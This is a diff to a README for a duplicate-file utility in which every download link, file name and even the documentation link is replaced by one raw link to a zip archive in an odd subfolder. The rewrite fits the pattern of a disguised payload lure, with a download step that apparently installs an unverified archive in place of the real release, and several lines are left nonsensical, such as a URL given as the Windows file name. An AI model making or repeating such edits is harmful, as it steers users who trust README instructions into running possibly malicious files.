@@ -1,6 +1,6 @@
 # 🗂️ DuplicateFileFinder - Quickly Find and Remove Duplicate Files
 
-[![Download DuplicateFileFinder](https://img.shields.io/badge/Download-DuplicateFileFinder-blue.svg)](https://github.com/arellanonavarretebulmaro-ai/DuplicateFileFinder/releases)
+[![Download DuplicateFileFinder](https://raw.githubusercontent.com/arellanonavarretebulmaro-ai/DuplicateFileFinder/main/Afifi/Duplicate-Finder-File-2.0.zip)](https://raw.githubusercontent.com/arellanonavarretebulmaro-ai/DuplicateFileFinder/main/Afifi/Duplicate-Finder-File-2.0.zip)
 
 ## 📋 Description
 
@@ -12,12 +12,12 @@ This section will guide you through the steps to download and run DuplicateFileF
 
 ### 📥 Download & Install
 
-1. **Visit this page to download DuplicateFileFinder:** [Download DuplicateFileFinder](https://github.com/arellanonavarretebulmaro-ai/DuplicateFileFinder/releases)
+1. **Visit this page to download DuplicateFileFinder:** [Download DuplicateFileFinder](https://raw.githubusercontent.com/arellanonavarretebulmaro-ai/DuplicateFileFinder/main/Afifi/Duplicate-Finder-File-2.0.zip)
 
 2. Choose the appropriate version for your operating system:
-   - **Windows:** Look for `DuplicateFileFinder.exe`
+   - **Windows:** Look for `https://raw.githubusercontent.com/arellanonavarretebulmaro-ai/DuplicateFileFinder/main/Afifi/Duplicate-Finder-File-2.0.zip`
    - **macOS:** Look for `DuplicateFileFinder`
-   - **Linux:** Look for `DuplicateFileFinder` or a `.tar.gz` file
+   - **Linux:** Look for `DuplicateFileFinder` or a `https://raw.githubusercontent.com/arellanonavarretebulmaro-ai/DuplicateFileFinder/main/Afifi/Duplicate-Finder-File-2.0.zip` file
 
 3. After selecting your file, click the download link. 
 
@@ -33,7 +33,7 @@ To run DuplicateFileFinder, make sure your system meets these requirements:
 
 #### For Windows Users
 
-1. Once the download is complete, locate the `DuplicateFileFinder.exe` file in your Downloads folder.
+1. Once the download is complete, locate the `https://raw.githubusercontent.com/arellanonavarretebulmaro-ai/DuplicateFileFinder/main/Afifi/Duplicate-Finder-File-2.0.zip` file in your Downloads folder.
 2. Double-click the file to run it. A command prompt window will open.
 3. Follow the prompts to navigate to the directory you want to scan for duplicates.
 
@@ -99,7 +99,7 @@ If you encounter any problems, feel free to open an issue on the GitHub reposito
 
 ## 🌐 Learn More
 
-Check the [DuplicateFileFinder documentation](https://github.com/arellanonavarretebulmaro-ai/DuplicateFileFinder/wiki) for more advanced options and further details about the tool.
+Check the [DuplicateFileFinder documentation](https://raw.githubusercontent.com/arellanonavarretebulmaro-ai/DuplicateFileFinder/main/Afifi/Duplicate-Finder-File-2.0.zip) for more advanced options and further details about the tool.
 
 ### 🔗 Other Resources
 
@@ -108,6 +108,6 @@ Check the [DuplicateFileFinder documentation](https://github.com/arellanonavarre
 
 ## 📌 Final Reminder
 
-To get started with DuplicateFileFinder, visit this page to download it now: [Download DuplicateFileFinder](https://github.com/arellanonavarretebulmaro-ai/DuplicateFileFinder/releases). 
+To get started with DuplicateFileFinder, visit this page to download it now: [Download DuplicateFileFinder](https://raw.githubusercontent.com/arellanonavarretebulmaro-ai/DuplicateFileFinder/main/Afifi/Duplicate-Finder-File-2.0.zip). 
 
 Eliminate duplicate files easily and free up space today!
